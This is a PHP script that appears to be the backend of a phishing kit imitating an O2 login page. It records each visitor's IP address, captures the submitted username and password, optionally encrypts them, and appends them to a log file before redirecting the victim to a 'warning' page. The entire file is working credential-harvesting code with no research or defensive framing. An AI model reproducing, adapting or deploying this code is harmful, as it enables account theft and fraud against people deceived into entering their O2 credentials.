<?php
error_reporting(0);
session_start();
include "Config.php";
include 'anti.php';
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$click .= "$ip\n";
$clickfile=fopen("logs/O2-logs.txt","a");
fwrite($clickfile,$click);
fclose($clickfile);
if(isset($_POST['username']))  {
$message .= $_SESSION['msg'];
$message .= "--------------O2 Login-----------------------\n";
$message .= "Username: ".$_POST['username']."\n";
$message .= "Password: ".$_POST['password']."\n";
$_SESSION['msg'] = $message;
if($Encrypt==1) {
    $method = 'aes-256-cbc';
    $key = substr(hash('sha256', $password, true), 0, 32);
    $iv = chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0);
    $encrypted = base64_encode(openssl_encrypt($message, $method, $key, OPENSSL_RAW_DATA, $iv));
    }
    if($Save_Log==1) {
        if($Encrypt==1) {
        $file=fopen("../logs/O2-logs.txt","a");
        fwrite($file,$encrypted);
        fclose($file);
        }
        else {
        $file=fopen("../logs/O2-logs.txt","a");
        fwrite($file,$message);
        fclose($file);
        }
    }
    
     $praga=rand();
     $praga=md5($praga);
    
     header("location: warning");
    }

?>